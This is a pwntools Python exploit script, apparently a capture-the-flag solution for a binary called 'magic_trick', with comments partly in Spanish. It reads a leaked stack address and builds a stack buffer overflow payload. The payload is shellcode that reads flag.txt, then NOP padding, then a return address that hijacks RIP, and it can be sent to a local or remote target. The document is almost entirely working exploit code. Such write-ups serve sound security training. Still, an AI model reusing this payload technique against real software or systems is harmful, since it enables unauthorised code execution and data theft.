from pwn import *
import re
from pwn import p64

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './magic_trick'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

output = io.readuntil(b'>>') 
direccion_regex = re.compile(r"'(0x[0-9a-fA-F]+)'")
match = direccion_regex.search(output.decode('utf-8'))

if match:
    direccion = match.group(1)
else:
    print("No se pudo encontrar la dirección")
    io.close()
    exit()

print(f"Dirección para RIP extraida: {direccion}")

# El comando pwndbg> x/gx <direccion> se puede utilizar para saber qué contiene la direccion

padding = 72

shellcode = asm(shellcraft.cat('flag.txt'))
shellcode += asm(shellcraft.exit())

payload = flat(
    shellcode,
    asm('nop') * (padding - len(shellcode)),
    pack(int(direccion, 16)),
)

print(f"Payload listo para enviar: {payload}")

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendline(b'Y')
io.sendlineafter(b'>>',payload)

# Receive the flag
io.interactive()

